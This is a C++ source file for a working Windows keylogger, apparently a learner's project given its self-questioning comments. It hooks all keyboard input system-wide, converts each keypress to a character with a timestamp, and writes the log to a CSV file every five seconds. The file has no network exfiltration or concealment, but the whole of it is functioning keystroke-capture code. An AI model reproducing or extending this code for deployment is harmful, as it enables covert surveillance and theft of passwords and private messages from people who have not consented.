#include <iostream>
#include <windows.h>
#include <string>
#include <fstream> 
#include <thread>
#include <mutex>
#include <unordered_map>
#include <chrono>
#include <ctime>
#include <vector>
#include <sstream>
#include <winuser.h>

HHOOK keyboardHook = NULL;
std::vector<std::pair<std::string, std::wstring>> keystrokeVector;
std::unordered_map<DWORD, bool> keyStates;
std::mutex bufferMutex; 

void WriteVectorToFile() {
    std::wofstream outFile("keystrokes.csv", std::ios::app);
    if (!outFile.is_open()) {
        std::cerr << "Failed to open file for writing: " << GetLastError();
        return; 
    } 
    std::lock_guard<std::mutex> guard(bufferMutex);

    for (const auto& entry : keystrokeVector) {
        outFile << entry.first.c_str() << L"," << entry.second << L"\n";
    }

    keystrokeVector.clear();
    outFile.close();
}

void PeriodicVectorFlush() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(5)); //Flush every 5 secs.
        WriteVectorToFile();
    }
}

std::string GetTimestap() {
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
    char buffer[26];
    ctime_s(buffer, sizeof(buffer), &now_time); //Converts time_t variable to a c-string of the current time.
    buffer[24] = '\0'; //Remove next line character. 
    return std::string(buffer);
}

wchar_t VirtualKeyTochar(DWORD vkCode, bool shiftPressed) {
    BYTE keyboardState[256]; // Buffer of all the 256 possible virtual keyboard states in windows. 
    GetKeyboardState(keyboardState); // Fill the array with the current keyboard state. 

    if (shiftPressed) {
        keyboardState[VK_SHIFT] = 0x80;
    } else {
        keyboardState[VK_SHIFT] = 0;
    }

    // Can change size later if needed. 
    wchar_t buffer[256] = {0}; // Buffer holding the resulting unicode characters.
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC); // Consider different versions of MapVirtualKey.
    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 256, 0);

    // result equal to 1 means translation from vkcode to unicode successfull. 
    if (result > 0) {
        std::wcout << L"Buffer: " << buffer << L" Result: " << result << "\n";
        return buffer[0];
    } else if (result == -1) {
        std::wcout << L"Dead key or special state encountered. \n"; 
    }

    // Consider returning a spesific key when this happens? 
    return 0;
}



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kbdStruct->vkCode;

        //Why place mutex here? 
        std::lock_guard<std::mutex> guard(bufferMutex);
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            
            //Check if the key was released. 
            if (!keyStates[vkCode]) {
                keyStates[vkCode] = true;


                // Checks if the shift key is pressen. TODO: understand why we use this notation.
                bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

                wchar_t character = VirtualKeyTochar(vkCode, shiftPressed);
                std::string timestamp = GetTimestap();
                std::wstring keypress;

                if (character != 0) {
                    keypress = character; 
                } else {
                    keypress = L"[VK:" + std::to_wstring(vkCode) + L"]";
                }

                keystrokeVector.emplace_back(timestamp, keypress);               
            }    
        }
            //Log that a key has been released.        
            else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
                keyStates[vkCode] = false; 
            } 
    }
        
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam); 
}


int main() {
    std::thread flushThread(PeriodicVectorFlush);
    flushThread.detach(); // Run the flushThread thread independently from the main thread. 
    
    // Install keyboard hook.
    keyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        KeyboardProc, 
        GetModuleHandle(NULL),
        0);

    // Handle error if we fail to install hook.
    if (keyboardHook == NULL) {
        std::cerr << "(-) failed to install hook: " << GetLastError() << std::endl;
        return 1;
    }


    // Message loop: Dispatch messages generated from the events in the hook 
    MSG msg; 
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // Unsintall hooks.
    UnhookWindowsHookEx(keyboardHook);

    return 0;
};